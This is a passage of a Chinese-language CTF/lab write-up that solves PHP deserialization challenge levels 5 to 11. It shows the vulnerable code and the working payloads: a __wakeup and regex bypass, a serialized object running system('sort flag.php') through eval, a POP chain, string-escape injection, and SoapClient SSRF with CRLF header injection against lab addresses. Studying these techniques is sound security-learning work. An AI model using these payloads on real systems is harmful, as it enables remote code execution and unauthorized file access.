&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Are you daydreaming?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//sercet in flag.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;a href=<span class="string">&quot;../level6&quot;</span>&gt;点击进入第六关&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><strong>wakeup绕过，正则表达式绕过</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$file</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">secret</span>());</span><br><span class="line"><span class="comment">#O:6:&quot;secret&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br><span class="line"><span class="comment">#绕过正则，在6前面添个+号，绕过wakeup，把1改成2，成员数量不一致即可</span></span><br><span class="line"><span class="comment">#修改后：O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240423224017009.png" alt="image-20240423224017009"></p><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$comm</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$com</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;comm = <span class="variable">$com</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;comm);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;%&quot;</span>,<span class="string">&quot;daydream&quot;</span>,<span class="variable">$param</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$param</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;br&gt;&lt;a href=<span class="string">&quot;../level7&quot;</span>&gt;点击进入第七关&lt;/a&gt;s</span><br></pre></td></tr></table></figure><p> 本关对输入的param进行了一个%的过滤，而且类中的属性的变量是私有属性</p><p><strong>private属性序列化的时候格式是 %00类名%00成员名</strong></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$comm</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$com</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;comm = <span class="variable">$com</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;comm);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">secret</span>(<span class="string">&quot;system(&#x27;sort flag.php&#x27;);&quot;</span>);</span><br><span class="line"><span class="comment">#O:6:&quot;secret&quot;:1:&#123;s:12:&quot;%00secret%00comm&quot;;s:24:&quot;system(&#x27;sort flag.php&#x27;);&quot;;&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$pa</span>), <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>但还是不行， 这里因为%00被url解码后是不可见字符，所以要在类名左右加上\00且要将上面的小写s改成S</p><p><strong>与小写”s”不同，大写”S”表示键名或属性名是区分大小写的。</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#O:6:&quot;secret&quot;:1:&#123;S:12:&quot;\00secret\00comm&quot;;s:24:&quot;system(&#x27;sort flag.php&#x27;);&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240423230938596.png" alt="image-20240423230938596"></p><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">you</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$body</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pro</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)#反序列化时调用</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$project</span>=<span class="variable language_">$this</span>-&gt;pro;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;body-&gt;<span class="variable">$projecct</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">my</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>)//调用不存在方法的时候，</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func</span> == <span class="string">&#x27;yourname&#x27;</span> <span class="keyword">and</span> <span class="variable language_">$this</span>-&gt;name == <span class="string">&#x27;myname&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>当调用不存在的方法时，会把不存在的方法名赋值给第一个参数，所以不存在的方法最好就是yourname,所以pro可以设置成yourname，而要调用不存在的方法，可以new一个my赋值给body，所以构造出来的代码是</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">you</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$body</span> = <span class="keyword">new</span> <span class="title function_ invoke__">my</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pro</span>=<span class="string">&#x27;yourname&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">my</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;myname&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">you</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#$a=$_GET[&#x27;a&#x27;];</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但这样运行会报错，PHP不允许在类属性的声明中使用直接实例化的方式。</p><p>类属性的初始化必须使用常量或静态表达式，而不能使用函数调用或实例化操作。因此，将$body属性的初始化移动到类的构造函数中会解决这个问题。比如在serialize时会调用的construct方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">you</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$body</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pro</span> = <span class="string">&#x27;yourname&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;body = <span class="keyword">new</span> <span class="title function_ invoke__">my</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">my</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;myname&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">you</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//然后记得将私有属性的%00补上</span></span><br><span class="line"><span class="comment">//O:3:&quot;you&quot;:2:&#123;s:9:&quot;%00you%00body&quot;;O:2:&quot;my&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;myname&quot;;&#125;s:8:&quot;%00you%00pro&quot;;s:8:&quot;yourname&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240424202419211.png" alt="image-20240424202419211"></p><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span>=<span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="variable">$name</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>=<span class="string">&#x27;daydream&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;pass==<span class="string">&#x27;escaping&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>字符串逃逸，重要的是让filter里的name&#x3D;&#x3D;escaping，test不用考虑，下面来看看要几个php把,先把需要的序列化字符串构造出来</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span> = <span class="string">&quot;123&quot;</span>;<span class="comment">#这个随便打</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span> = <span class="string">&quot;escaping&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"><span class="comment">//O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:3:&quot;123&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>关键是要**s:4:”pass”;s:8:”escaping”;}**这一段，这时就要让吐出来的字符数为29个，加上前面的引号和冒号,而1个php转换成hack会吃掉一个字符，所以全部要29个php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#$user=&#x27;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>最终代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>=<span class="string">&#x27;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span> = <span class="string">&quot;escaping&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"><span class="comment">#O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:116:&quot;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240424204156850.png" alt="image-20240424204156850"></p><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a><strong>level9</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这个是格式方法错误导致被调用。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="comment">//即把对象当成字符串 调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//unserialize() 会检查是否存在一个wakeup()方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="comment">//序列化时调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//调用的成员属性不存在</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先，要想页面返回flag，我们就要调用append方法，而append方法时通过invoke方法赋值，而invoke是通过错误格式方法来触发，这就要找能调用方法的地方，可以找到get，而能触发get的方法就要找到可以读取属性的地方，即toString，而触发toString的地方只有Show，所以show就是头</p><p>构造poc</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">#先从头开始</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();                                             <span class="variable">$a</span>-&gt;source = <span class="variable">$a</span>;<span class="comment">//把对象当字符串调用</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str = <span class="variable">$b</span>;<span class="comment">//source类中的str赋值为Test类,当调用该类中不存在的属性source时触发get</span></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;p=<span class="variable">$c</span>;<span class="comment">//把类赋值给方法触发invoke</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));<span class="comment">//从头开始序列化</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A13%3A%22%00Modifier%00var%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240424212028638.png" alt="image-20240424212028638"></p><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>本关需要开启soap拓展且php版本在5.6、找到配置文件 php-ini</p><p><img src="/../image/image-20240424214011774.png" alt="image-20240424214011774"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]);</span><br><span class="line"><span class="variable">$c</span> -&gt; <span class="title function_ invoke__">daydream</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">In this topic,it is of course possible to pass parameters directly to flag.php, but it is not recommended to use this method to learn SOAP.</span></span><br><span class="line"><span class="comment">flag.php</span></span><br><span class="line"><span class="comment">$flag=&quot;*&quot;;</span></span><br><span class="line"><span class="comment">$user=$_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span></span><br><span class="line"><span class="comment">$pass = $_POST[&#x27;pass&#x27;];</span></span><br><span class="line"><span class="comment">if(isset($pass) and isset($user))&#123;</span></span><br><span class="line"><span class="comment">    if($pass==&#x27;password&#x27; and $user==&#x27;admin&#x27;)&#123;</span></span><br><span class="line"><span class="comment">        file_put_contents(&#x27;flag.txt&#x27;,$flag);</span></span><br><span class="line"><span class="comment">    &#125;    </span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>前置知识;<a href="https://blog.csdn.net/solitudi/article/details/113588692">https://blog.csdn.net/solitudi/article/details/113588692</a></p><p>在给出的代码中，有一个名为flag.php的文件。这个文件的作用是根据一些条件将一个标志($flag)写入到flag.txt文件中。</p><p>下面是对代码的解释：</p><ol><li><p>首先，定义了一个变量$flag，其初始值为”*”，表示标志的内容。</p></li><li><p>接下来，通过$_SERVER[‘HTTP_USER_AGENT’]获取了用户的User-Agent信息，并将其赋值给变量$user。</p></li><li><p>然后，通过$_POST[‘pass’]获取了来自POST请求的pass参数的值，并将其赋值给变量$pass。</p></li><li><p>在if条件语句中，首先使用isset()函数检查$pass和$user是否都存在。</p></li><li><p>如果$pass的值等于”password”并且$user的值等于”admin”，则条件成立。</p></li><li><p>在条件成立的情况下，使用file_put_contents()函数将$flag的内容写入到名为flag.txt的文件中。</p></li></ol><p>综上所述，这段代码的逻辑是，当接收到POST请求中包含正确的密码(“password”)和用户代理信息(“admin”)时，将标志($flag)的内容写入到flag.txt文件中。这可以作为一个简单的身份验证和授权机制，只有在满足特定条件时才会写入标志文件。</p><p><img src="/../image/image-20240424212652149.png" alt="image-20240424212652149"></p><p>在后台返回一下falg.php的一些值看看，在从0-1看到了类似的题目,原生类的利用public SoapClient :: SoapClient(mixed $wsdl [，array $options ])<br>第一个参数是用来指明是否是wsdl模式，如果为<code>null</code>，那就是非wsdl模式。<br>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。 </p><p> 还要利用crlf注入漏洞(\r\n)</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$post_data</span>=<span class="string">&#x27;pass=password&#x27;</span>;</span><br><span class="line"><span class="variable">$data_len</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_data</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;http://192.168.199.177:8080&#x27;</span>=&gt;<span class="string">&#x27;http://192.168.174.143/ser/level10/flag.php&#x27;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;admin^^Content-Type: application/x-www-form-urlencoded^^Content-Length: &#x27;</span>.<span class="variable">$data_len</span>.<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_data</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;bbba&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$b</span>);<span class="comment">//将^^改为\r\n</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">#O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22bbba%22%3Bs%3A8%3A%22location%22%3Bs%3A43%3A%22http%3A%2F%2F192.168.174.143%2Fser%2Flevel10%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A91%3A%22admin%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Apass%3Dpassword%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span></span><br></pre></td></tr></table></figure><p>然后直接访问目录下的txt文件即可</p><p><img src="/../image/image-20240425145934461.png" alt="image-20240425145934461"></p><p><img src="/../image/image-20240425145942258.png" alt="image-20240425145942258"></p><h2 id="level11phar反序列化"><a href="#level11phar反序列化" class="headerlink" title="level11phar反序列化"></a>level11phar反序列化</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span 